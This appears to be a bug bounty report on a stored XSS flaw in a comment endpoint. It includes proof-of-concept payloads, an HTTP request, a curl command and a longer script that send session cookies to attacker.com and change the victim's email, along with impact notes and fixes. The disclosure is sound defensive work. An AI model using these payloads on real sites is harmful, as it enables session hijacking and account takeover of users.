# Stored XSS in Comment Section with Session Hijacking

## Researcher
elite_bug_hunter

## Submission Date
2025-10-12

## Vulnerability Type
Cross-Site Scripting (XSS) - Stored

## Severity
High

## Affected Components
- /api/comments/create
- /comments/view/{id}
- CommentController.createComment()
- comment_display.js

## Description
A stored XSS vulnerability exists in the comment creation endpoint that allows attackers to inject malicious JavaScript code that executes in the context of other users' browsers. The application fails to properly sanitize HTML entities in user-submitted comments before rendering them on the page.

## Reproduction Steps

1. Navigate to https://example.com/comments/create
2. Submit a comment with the following XSS payload
3. The payload will be stored in the database without sanitization
4. When any user views the comment, the JavaScript executes
5. The attacker can steal session cookies and perform actions on behalf of the victim

## Proof of Concept

### HTTP Request to Create Malicious Comment

```http
POST /api/comments/create HTTP/1.1
Host: example.com
Content-Type: application/json
Cookie: session_id=abc123def456; user_token=xyz789
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0fQ

{
  "post_id": 42,
  "comment_text": "<img src=x onerror='fetch(\"https://attacker.com/steal?cookie=\"+document.cookie)'>",
  "author_name": "Innocent User"
}
```

### Alternative cURL Command

```bash
curl -X POST 'https://example.com/api/comments/create' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session_id=abc123def456; user_token=xyz789' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0fQ' \
  -d '{
    "post_id": 42,
    "comment_text": "<img src=x onerror='\''fetch(\"https://attacker.com/steal?cookie=\"+document.cookie)'\''>"
  }'
```

### More Sophisticated Payload

```javascript
<script>
// Steal session cookie
var cookie = document.cookie;
var sessionId = cookie.match(/session_id=([^;]+)/)[1];

// Send to attacker's server
fetch('https://attacker.com/collect', {
  method: 'POST',
  body: JSON.stringify({
    cookie: cookie,
    sessionId: sessionId,
    url: window.location.href,
    userAgent: navigator.userAgent
  })
});

// Perform actions on behalf of user
fetch('/api/account/change-email', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```

## Impact

This vulnerability allows an attacker to:

1. **Session Hijacking**: Steal session cookies and impersonate users
2. **Account Takeover**: Change user settings, email addresses, or passwords
3. **Data Theft**: Access sensitive user information
4. **Malware Distribution**: Redirect users to malicious sites
5. **Phishing**: Display fake login forms to steal credentials
6. **Defacement**: Modify page content for all users viewing the comment

The impact is severe because:
- The XSS is **stored** (persistent), affecting all users who view the comment
- The affected page is high-traffic (comment section)
- Session cookies are not marked as HttpOnly
- No Content Security Policy (CSP) is implemented

## Recommended Fix

1. Implement proper output encoding using a library like DOMPurify
2. Set HttpOnly flag on session cookies
3. Implement Content Security Policy (CSP) headers
4. Use a templating engine with auto-escaping
5. Validate and sanitize all user input on the server side

## Attachments
- screenshot_xss_execution.png
- network_capture.har
- poc_video.mp4

